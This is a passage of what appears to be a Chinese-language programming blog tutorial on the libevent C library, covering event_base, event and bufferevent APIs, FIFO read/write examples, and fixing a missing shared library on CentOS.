<span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evbuffer</span> *<span class="title">output</span> = <span class="title">bufferevent_get_output</span>(<span class="title">bev</span>);</span></span><br><span class="line"><span class="keyword">if</span> (evbuffer_get_length(output) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flushed answer\n"</span>);</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_eventcb(struct bufferevent *bev, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Connection closed.\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; BEV_EVENT_ERROR) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Got an error on the connection: %s\n"</span>,</span><br><span class="line">    strerror(errno));<span class="comment">/*XXX win32*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* None of the other events can happen here, since we haven't enabled</span></span><br><span class="line"><span class="comment"> * timeouts */</span></span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">signal_cb(<span class="keyword">evutil_socket_t</span> sig, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">delay</span> = &#123;</span> <span class="number">2</span>, <span class="number">0</span> &#125;; <span class="comment">//延迟两秒</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Caught an interrupt signal; exiting cleanly in two seconds.\n"</span>);</span><br><span class="line"></span><br><span class="line">event_base_loopexit(base, &amp;delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="libevent框架"><a href="#libevent框架" class="headerlink" title="libevent框架"></a>libevent框架</h4><h5 id="创建event-base"><a href="#创建event-base" class="headerlink" title="创建event_base"></a>创建event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="function">struct event_base *<span class="title">event_base_new</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br></pre></td></tr></table></figure><h5 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h5><ul><li>常规事件 <code>event</code>—-&gt;<code>event_new()</code></li><li>带缓冲区的事件 <code>bufferevent</code> —-&gt;<code>bufferevent_socket_new()</code></li></ul><h5 id="添加事件"><a href="#添加事件" class="headerlink" title="添加事件"></a>添加事件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="启动循环"><a href="#启动循环" class="headerlink" title="启动循环"></a>启动循环</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_dispatch</span><span class="params">(struct event_base *base)</span></span>;</span><br><span class="line">base:event_base_new 函数的返回值</span><br><span class="line">  成功：<span class="number">0</span>，失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>只有<code>event_new</code>中指定了<code>EV_PERSIST</code>才持续触发，否则只触发一次，就跳出循环</p><p>通常设置为<code>EV_WRITE|EV_PERSIST</code>、<code>EV_READ|EV_PERSIST</code></p><h5 id="其他循环"><a href="#其他循环" class="headerlink" title="其他循环"></a>其他循环</h5><p>在指定时间后停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopexit</span><span class="params">(struct event_base *base,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><p>立即停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopbreak</span><span class="params">(struct event_base *base)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="释放event-base"><a href="#释放event-base" class="headerlink" title="释放event_base"></a>释放event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_base_free(base);</span><br></pre></td></tr></table></figure><h4 id="查看支持哪些多路I-O"><a href="#查看支持哪些多路I-O" class="headerlink" title="查看支持哪些多路I/O"></a>查看支持哪些多路I/O</h4><p><code>event.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">event_base_new</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> **buf;</span><br><span class="line">buf = event_get_supported_methods();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buf[%d]=%s\n"</span>,i,buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc event.c -o event -l event</span><br></pre></td></tr></table></figure><p>执行结果如下，可以发现mac并不支持<code>epoll</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro event % ./event </span><br><span class="line">buf[<span class="number">0</span>]=poll</span><br><span class="line">buf[<span class="number">1</span>]=select</span><br><span class="line">buf[<span class="number">2</span>]=(null)</span><br><span class="line">buf[<span class="number">3</span>]=(null)</span><br><span class="line">buf[<span class="number">4</span>]=(null)</span><br><span class="line">buf[<span class="number">5</span>]=(null)</span><br><span class="line">buf[<span class="number">6</span>]=(null)</span><br><span class="line">buf[<span class="number">7</span>]=(null)</span><br><span class="line">buf[<span class="number">8</span>]=(null)</span><br><span class="line">buf[<span class="number">9</span>]=(null)</span><br></pre></td></tr></table></figure><h4 id="创建事件-1"><a href="#创建事件-1" class="headerlink" title="创建事件"></a>创建事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct event *<span class="title">event_new</span><span class="params">(struct event_base *base,<span class="keyword">evutil_socket_t</span> fd,short what,event_callback_fn cb,<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line">base: event_base_new()返回值</span><br><span class="line">  fd: 绑定到event上的文件描述符</span><br><span class="line">  what: 对应的事件(读、写、异常)</span><br><span class="line">    EV_READ 一次读事件</span><br><span class="line">    EV_WRITE 一次写事件</span><br><span class="line">    EV_PERSIST 持续触发，结合event_base_dispatch函数使用</span><br><span class="line">  cb: 一旦事件满足监听条件，回调的函数</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*event_callback_fn)</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short,<span class="keyword">void</span> *)</span></span></span><br><span class="line">  arg: 回调的函数的参数</span><br><span class="line">  返回值: 成功创建的event</span><br></pre></td></tr></table></figure><h4 id="添加事件到base"><a href="#添加事件到base" class="headerlink" title="添加事件到base"></a>添加事件到base</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br><span class="line"></span><br><span class="line">ev: event_new()函数返回的事件</span><br><span class="line">  tv: <span class="literal">NULL</span>,即不会超时 一旦等到事件被触发，回调函数会被调用</span><br></pre></td></tr></table></figure><h4 id="从base拿下事件"><a href="#从base拿下事件" class="headerlink" title="从base拿下事件"></a>从base拿下事件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_del</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br></pre></td></tr></table></figure><h4 id="销毁事件"><a href="#销毁事件" class="headerlink" title="销毁事件"></a>销毁事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_free</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br><span class="line">  成功: <span class="number">0</span></span><br><span class="line">  失败: <span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="使用libevent读写fifo"><a href="#使用libevent读写fifo" class="headerlink" title="使用libevent读写fifo"></a>使用libevent读写fifo</h4><p><code>read_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read event: %s \n"</span>,what &amp; EV_READ ?<span class="string">"Yes"</span>:<span class="string">"No"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"data len = %d,buf = %s\n"</span>,len,buf);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unlink(<span class="string">"myfifo"</span>);</span><br><span class="line">mkfifo(<span class="string">"myfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_RDONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_READ|EV_PERSIST,read_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello,world-%d\n"</span>,num++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_WRONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_WRITE|EV_PERSIST,write_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在mac上编译执行之后发现并没有打印结果，<code>gdb</code>调试一下，发现卡在了<code>dispatch</code>这里，<code>dispatch</code>函数就相当于是<code>while+select/poll/epoll</code>这种形式，对于<code>libevent</code>库默认使用的是<code>epoll</code>，然而<code>epoll</code>对于mac是不支持的。</p><p><img src="/2021/11/19/浅学libevent/4.png" alt="4"></p><p>于是我把代码放到了<code>centos</code>服务器上，<code>./read_fifo</code>运行报错如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error <span class="keyword">while</span> loading shared libraries: libevent<span class="number">-2.1</span>.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><p>ldd查看依赖发现没有找到<code>libevent-2.1.so.6</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>创建软链接如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/lib/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> /usr/lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span></span><br></pre></td></tr></table></figure><p>再次查看依赖</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; /lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> (<span class="number">0x00007fda57a25000</span>)</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>之后分别执行<code>./read_fifo</code>和<code>./write_fifo</code>。发现成功读写</p><p><img src="/2021/11/19/浅学libevent/5.png" alt="5"></p><h4 id="事件的未决和非未决"><a href="#事件的未决和非未决" class="headerlink" title="事件的未决和非未决"></a>事件的未决和非未决</h4><ul><li>未决：有资格被处理，但尚未被处理</li><li>非未决：没有资格被处理</li></ul><p>事件的未决和非未决状态转换图如下所示</p><p><img src="/2021/11/19/浅学libevent/6.png" alt="6"></p><h4 id="bufferevent"><a href="#bufferevent" class="headerlink" title="bufferevent"></a>bufferevent</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>bufferevent</code>有两个缓冲区，也是队列实现，先进先出</p><p>读：有数据——&gt;读回调函数被调用——-&gt;使用<code>bufferevent_read()</code>——&gt;读数据</p><p>写：使用<code>bufferevent_write()</code>——-&gt;向写缓冲中写数据——-&gt;该缓冲区有数据自动写出——&gt;写完，回调函数被调用</p><h4 id="bufferevent创建和释放"><a href="#bufferevent创建和释放" class="headerlink" title="bufferevent创建和释放"></a>bufferevent创建和释放</h4><p>创建<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">ev</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">bufferevent</span> *<span class="title">bufferevent_socket_new</span>(<span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,<span class="title">evutil_socket_tfd</span>,<span class="title">enum</span> <span class="title">bufferevent_options</span> <span class="title">options</span>);</span></span><br><span class="line"></span><br><span class="line">base: event_base_new函数的返回值</span><br><span class="line">fd: 跟bufferevent绑定的文件描述符类比event_new()</span><br><span class="line">options: BEV_OPT_CLOSE_ON_FREE只用这一个即可</span><br><span class="line">   </span><br><span class="line">返回: 